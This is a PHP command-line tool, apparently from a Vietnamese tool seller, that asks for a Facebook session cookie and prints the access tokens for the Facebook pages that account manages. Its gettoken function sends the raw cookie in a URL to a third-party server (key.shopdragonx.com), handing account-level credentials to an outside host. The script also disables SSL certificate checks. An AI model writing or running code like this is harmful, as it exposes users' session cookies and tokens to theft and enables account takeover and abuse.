<?php
error_reporting(0);
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
$do="\033[1;91m";
$den="\033[1;33m";
$tim="\033[1;34m";
$luc="\033[1;92m";
$trang="\033[1;97m";
$vang = "\033[1;93m";
$hong = "\033[1;95m";
$xnhac = "\033[1;36m";
$xduong = "\033[1;96m";
/*** [ Copyright © 2023 DragonX ] ***/
$dragonx = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
/***[ Banner ]***/
$banner = "
\033[1;34m  █████╗ ███╗   ██╗     ██████╗ ██████╗ ██╗███╗   ██╗
\033[1;37m ██╔══██╗████╗  ██║    ██╔═══██╗██╔══██╗██║████╗  ██║
\033[1;34m ███████║██╔██╗ ██║    ██║   ██║██████╔╝██║██╔██╗ ██║
\033[1;37m ██╔══██║██║╚██╗██║    ██║   ██║██╔══██╗██║██║╚██╗██║
\033[1;34m ██║  ██║██║ ╚████║    ╚██████╔╝██║  ██║██║██║ ╚████║
\033[1;37m ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL GET TOKEN PRO5 
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mAN ORIN
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool970
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT: \033[1;37mhttps://zalo.me/g/dpfbxq529
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool970
\033[1;31m────────────────────────────────────────────────────────────\n";
@system('clear');
/***[ Clear + Thông Số Admin ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
    @system('clear'); 
} else { 
    @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
echo $dragonx.$luc."Nhập Cookie Facebook : \033[1;33m";
$cookie = trim(fgets(STDIN));
$token = gettoken($cookie);
if ($token == 'die'){
   exit($dragonx.$do."Cookie Die!!");
}
echo $dragonx.$luc."Bạn Muốn Lấy ".$vang."All".$luc." Token Page Không? (y/n) : \033[1;33m";
$luachon = trim(fgets(STDIN));
$get1 = req('https://graph.facebook.com/me/accounts?access_token=' . $token, $cookie);
$json_get = json_decode($get1, true);
if ($luachon == 'y' || $luachon == 'Y'){
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
foreach ($json_get["data"] as $get) {
echo $dragonx.$luc."Tên Page : ".$vang.$get['name']."\n";
echo $dragonx.$luc."ID Page : ".$vang.$get['id']."\n";
echo $dragonx.$luc."Token Page : ".$vang.$get['access_token']."\n";
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
}
die;
} else {
$stt = 0;
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
foreach ($json_get["data"] as $get) {
$stt++;
echo $dragonx.$do."[".$vang.$stt.$do."] ".$luc."Page : ".$vang.$get['name'].$trang." | ".$luc."ID : ".$vang.$get['id']."\n";
}
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx.$luc."Nhập Page Muốn Lấy Token : \033[1;33m";
$chon_page = trim(fgets(STDIN));
if (!is_numeric($chon_page)){
    exit($dragonx.$do."Nhập Số Thôi Bạn Ơi!!\n");
}
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
echo $dragonx.$luc."Tên Page : ".$vang.$json_get["data"][$chon_page - 1]['name']."\n";
echo $dragonx.$luc."ID Page : ".$vang.$json_get["data"][$chon_page - 1]['id']."\n";
echo $dragonx.$luc."Token Page : ".$vang.$json_get["data"][$chon_page - 1]['access_token']."\n";
echo "\033[1;31m────────────────────────────────────────────────────────────\n";
die;
}







function gettoken($cookie) {
    $get = file_get_contents("https://key.shopdragonx.com/apiv2/func.php?get_token=EAAG&cookie=".$cookie);
    return $get;
}
function req($url, $cookie)
{
    $ch   = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => $url,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_FOLLOWLOCATION => TRUE,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_HTTPHEADER =>
            array(
                "Cookie:" . $cookie,
            ),
            CURLOPT_SSL_VERIFYPEER => FALSE,
            CURLOPT_ENCODING => TRUE,
        )
    );
    $ch = curl_exec($ch);
    return $ch;
}
/*** [ Copyright © 2023 DragonX ] ***/
?>